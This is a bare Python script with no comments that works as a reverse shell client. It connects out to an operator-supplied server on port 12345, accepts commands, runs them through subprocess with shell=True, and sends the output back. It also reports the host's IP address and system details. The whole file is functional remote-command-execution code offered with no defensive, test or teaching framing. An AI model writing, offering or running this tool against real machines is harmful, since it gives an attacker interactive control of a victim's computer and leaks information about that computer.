import platform
import socket
import subprocess

def run_command(command):
    result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = result.stdout.read() + result.stderr.read()
    return output.decode()

def main():
    server_ip = input("Enter server IP: ")
    server_port = 12345
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))
    
    while True:
        command = client_socket.recv(4096).decode()
        if command.lower() == "exit":
            break
        elif command.lower() == "get_ip":
            client_ip = socket.gethostbyname(socket.gethostname())
            client_socket.send(client_ip.encode())
        elif command.lower() == "system_info":
            system_info = platform.uname()
            info = f"System: {system_info.system}\nNode Name: {system_info.node}\nRelease: {system_info.release}\nVersion: {system_info.version}\nMachine: {system_info.machine}\nProcessor: {system_info.processor}"
            client_socket.send(info.encode())
        elif command.lower() == "custom_command":
            custom_command = client_socket.recv(4096).decode()
            output = run_command(custom_command)
            client_socket.send(output.encode())
        else:
            output = run_command(command)
            client_socket.send(output.encode())

    client_socket.close()

if __name__ == "__main__":
    main()

